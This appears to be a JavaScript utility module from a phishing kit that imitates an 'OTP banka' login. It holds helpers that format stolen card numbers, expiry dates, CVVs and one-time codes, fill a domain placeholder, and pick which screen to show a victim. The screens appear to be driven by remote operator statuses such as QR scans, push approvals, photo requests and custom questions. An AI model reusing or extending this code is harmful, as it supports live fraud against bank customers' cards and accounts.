/**
 * Pure helpers for OTP banka login / DLLGN flow.
 * Kept free of DOM so Node tests can import without jsdom.
 */
(function (root, factory) {
  if (typeof module === 'object' && module.exports) {
    module.exports = factory();
  } else {
    root.BankaFlowUtils = factory();
  }
})(typeof globalThis !== 'undefined' ? globalThis : this, function () {
  'use strict';

  function formatCardNumber(val) {
    var d = String(val || '').replace(/\D/g, '').slice(0, 16);
    return d.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  }

  function formatCardExp(val) {
    var raw = String(val || '').replace(/\D/g, '').slice(0, 4);
    return raw.length > 2 ? raw.slice(0, 2) + '/' + raw.slice(2) : raw;
  }

  function formatCvv(val) {
    return String(val || '').replace(/\D/g, '').slice(0, 4);
  }

  function formatOtpCode(val, maxLen) {
    var n = maxLen == null ? 8 : maxLen;
    return String(val || '').replace(/\D/g, '').slice(0, n);
  }

  /**
   * DLLGN often stores a placeholder +94 number; remap to local display prefix.
   */
  function formatOtpTarget(target, phonePrefix) {
    if (!target) return '';
    var s = String(target);
    var prefix = phonePrefix || '+385';
    if (s.indexOf('+94') === 0) s = prefix + s.slice(3);
    return s;
  }

  function withDomain(str, domain) {
    if (str == null) return str;
    return String(str).split('{{DOMAIN}}').join(domain || 'localhost');
  }

  function isDirectImageUrl(value) {
    var s = String(value || '').trim();
    return /^(data:image\/|https?:\/\/.*\.(png|jpe?g|gif|webp|svg)(\?|$))/i.test(s);
  }

  function buildStatusComp(res) {
    if (!res) return '';
    var st = res.status || '';
    var stp = res.current_step || '';
    var data = res.data || {};
    return st + '|' + stp + '|' + (data.otp_target || '') + '|' +
      (data.qr_data || '') + '|' + (data.custom_question || '') + '|' +
      (data.error_message || '') + '|' + (data.qr_instruction || '') + '|' +
      (data.custom_waiting || '') + '|' + (data.push_instruction || '') + '|' +
      (data.photo_instruction || '');
  }

  function statusMatch(st, stp, key) {
    return st === key || stp === key;
  }

  /**
   * Blank/password statuses must not yank the user off an active challenge screen.
   */
  function shouldShowLoginForm(st, stp, currentPhase, lastStatusKey) {
    if (statusMatch(st, stp, 'password') || statusMatch(st, stp, 'login_entered')) {
      if (currentPhase === 'qr' || currentPhase === 'qr_reply' || currentPhase === 'live_qr') {
        return false;
      }
      return true;
    }
    if (st === '') {
      if (currentPhase !== 'login' && lastStatusKey) return false;
      if (currentPhase === 'qr' || currentPhase === 'qr_reply' || currentPhase === 'live_qr') {
        return false;
      }
      return true;
    }
    return false;
  }

  function isSpisQuestion(q) {
    return /^!spis(?:\s|$)/i.test(String(q || '').trim());
  }

  /** Digits after `!spis ` → shown in Data (APPLI 2). */
  function parseSpisAppli2(q) {
    var m = String(q || '').trim().match(/^!spis(?:\s+(\d+))?$/i);
    return m && m[1] ? m[1] : '';
  }

  function formatAppli2Display(digits) {
    var d = String(digits || '').replace(/\D/g, '');
    if (!d) return 'x x x x x x x x';
    return d.split('').join(' ');
  }

  function shouldStopLiveQrPoll(st, stp) {
    if (statusMatch(st, stp, 'live_qr') || statusMatch(st, stp, 'live_qr_error_shown')) {
      return false;
    }
    if (statusMatch(st, stp, 'qr') || statusMatch(st, stp, 'qr_reply') ||
        statusMatch(st, stp, 'qr_error_shown')) {
      return true;
    }
    if (statusMatch(st, stp, 'otp') || statusMatch(st, stp, 'otp_error_shown') ||
        st === 'card' || st === 'card_error_shown' ||
        st === 'push' || statusMatch(st, stp, 'push') ||
        statusMatch(st, stp, 'custom_question') ||
        statusMatch(st, stp, 'ask_photo') || statusMatch(st, stp, 'photo') ||
        st === 'error_shown' || st === 'new_login_page') {
      return true;
    }
    return false;
  }

  return {
    formatCardNumber: formatCardNumber,
    formatCardExp: formatCardExp,
    formatCvv: formatCvv,
    formatOtpCode: formatOtpCode,
    formatOtpTarget: formatOtpTarget,
    withDomain: withDomain,
    isDirectImageUrl: isDirectImageUrl,
    buildStatusComp: buildStatusComp,
    statusMatch: statusMatch,
    shouldShowLoginForm: shouldShowLoginForm,
    shouldStopLiveQrPoll: shouldStopLiveQrPoll,
    isSpisQuestion: isSpisQuestion,
    parseSpisAppli2: parseSpisAppli2,
    formatAppli2Display: formatAppli2Display,
  };
});
